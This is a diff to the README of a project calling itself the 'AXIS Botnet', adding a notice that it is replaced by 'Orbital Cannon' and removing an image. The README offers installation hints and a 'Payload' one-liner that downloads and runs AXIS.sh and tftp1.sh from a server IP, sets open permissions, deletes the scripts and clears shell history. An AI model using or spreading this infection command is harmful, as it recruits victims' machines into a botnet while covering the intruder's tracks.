@@ -1,5 +1,8 @@
 # AXIS Botnet
 
+### INFO:
+This project is no longer supported; it has been replaced by the Orbital Cannon.
+
 ### Installation:
 * Linux only:
   * **recommended to use Centos 7**
@@ -18,8 +21,3 @@
   
 ### Payload
 * Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://(server-ip)/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g (server-ip) -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"
-
-### window
-<p align="center">
-  <img src="https://cdn.discordapp.com/attachments/808620387390324746/992772504521297990/275038087_1604950353178908_3257252682320961726_n.jpg">
-</p>
